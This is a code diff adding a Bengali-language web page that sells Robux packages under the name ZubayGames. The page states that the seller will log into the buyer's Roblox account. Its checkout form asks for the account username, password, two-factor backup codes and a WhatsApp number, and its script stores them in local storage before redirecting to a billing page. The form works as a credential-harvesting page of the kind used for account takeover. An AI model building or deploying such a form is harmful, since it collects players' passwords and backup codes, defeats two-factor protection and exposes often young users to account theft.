@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Buy Robux - ZubayGames</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+</head>
+<body class="bg-[#0b111e] text-white font-sans min-h-screen">
+
+  <header class="border-b border-gray-800 bg-[#0f172a] sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
+      <a href="index.html" class="text-2xl font-black tracking-wider text-cyan-400 uppercase">Zubay<span class="text-white">Games</span></a>
+      <a href="index.html" class="text-sm font-medium text-gray-400 hover:text-cyan-400 transition">← Store-এ ফিরে যান</a>
+    </div>
+  </header>
+
+  <main class="max-w-7xl mx-auto px-4 py-12">
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+      
+      <div class="lg:col-span-5 space-y-6">
+        <div class="w-full h-64 bg-cover bg-center rounded-2xl border border-gray-800" style="background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKYhzyCKitqcDZi2kGZue8Wbyv-M8LHPohWk_qsgl-m0Ak5pKr3S2DVHh4&s=10');"></div>
+        <div class="bg-[#0f172a] border border-gray-800 rounded-xl p-5">
+          <h3 class="text-xs font-black text-cyan-400 uppercase mb-3">⚡ জরুরি তথ্য</h3>
+          <p class="text-xs text-gray-400">● আমরা আপনার আইডিতে লগইন করে Robux যোগ করবো।<br>● অর্ডার সম্পন্ন হওয়ার সাথে সাথে আপনার ডাটা মুছে ফেলা হবে।</p>
+        </div>
+      </div>
+
+      <div class="lg:col-span-7 space-y-8">
+        <div class="space-y-4">
+          <h2 class="text-base font-black text-cyan-400 uppercase">১. প্যাকেজ সিলেক্ট করুন</h2>
+          <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
+            <button onclick="selectPackage(this, '80 Robux', '70.00')" class="pack-btn bg-[#0f172a] border border-cyan-500 p-4 rounded-xl transition">
+              <div class="text-xs font-black">80 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">70.00 ৳</div>
+            </button>
+            <button onclick="selectPackage(this, '400 Robux', '350.00')" class="pack-btn bg-[#0f172a] border border-gray-800 p-4 rounded-xl transition">
+              <div class="text-xs font-black">400 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">350.00 ৳</div>
+            </button>
+            <button onclick="selectPackage(this, '800 Robux', '680.00')" class="pack-btn bg-[#0f172a] border border-gray-800 p-4 rounded-xl transition">
+              <div class="text-xs font-black">800 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">680.00 ৳</div>
+            </button>
+            <button onclick="selectPackage(this, '1700 Robux', '1400.00')" class="pack-btn bg-[#0f172a] border border-gray-800 p-4 rounded-xl transition">
+              <div class="text-xs font-black">1700 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">1,400.00 ৳</div>
+            </button>
+            <button onclick="selectPackage(this, '4500 Robux', '3600.00')" class="pack-btn bg-[#0f172a] border border-gray-800 p-4 rounded-xl transition">
+              <div class="text-xs font-black">4500 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">3,600.00 ৳</div>
+            </button>
+            <button onclick="selectPackage(this, '10000 Robux', '7800.00')" class="pack-btn bg-[#0f172a] border border-gray-800 p-4 rounded-xl transition">
+              <div class="text-xs font-black">10000 Robux</div>
+              <div class="text-[11px] font-bold text-gray-400">7,800.00 ৳</div>
+            </button>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <input type="text" id="roblox-id" placeholder="Roblox Username" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-200">
+            <input type="password" id="roblox-pass" placeholder="Password" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-200">
+            <input type="text" id="backup-codes" placeholder="Backup Codes" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-200">
+            <input type="text" id="contact-number" placeholder="WhatsApp Number" class="w-full bg-[#131b2e] border border-gray-700 rounded-xl px-4 py-3 text-sm text-gray-200">
+        </div>
+        
+        <button onclick="handleBuyNow()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-black font-black py-4 rounded-xl text-sm transition">
+          অর্ডার কনফার্ম করুন 🚀
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    let currentPackTitle = "80 Robux";
+    let currentPackPrice = "70.00";
+
+    function selectPackage(btn, title, price) {
+        currentPackTitle = title;
+        currentPackPrice = price;
+        document.querySelectorAll('.pack-btn').forEach(b => {
+            b.classList.remove('border-cyan-500');
+            b.classList.add('border-gray-800');
+        });
+        btn.classList.add('border-cyan-500');
+        btn.classList.remove('border-gray-800');
+    }
+
+    function handleBuyNow() {
+        localStorage.setItem('checkout_roblox_id', document.getElementById('roblox-id').value);
+        localStorage.setItem('checkout_password', document.getElementById('roblox-pass').value);
+        localStorage.setItem('checkout_backup_codes', document.getElementById('backup-codes').value);
+        localStorage.setItem('checkout_contact_number', document.getElementById('contact-number').value);
+        localStorage.setItem('checkout_pack_title', currentPackTitle);
+        localStorage.setItem('checkout_pack_price', currentPackPrice);
+        window.location.href = "bill.html";
+    }
+  </script>
+</body>
+</html>
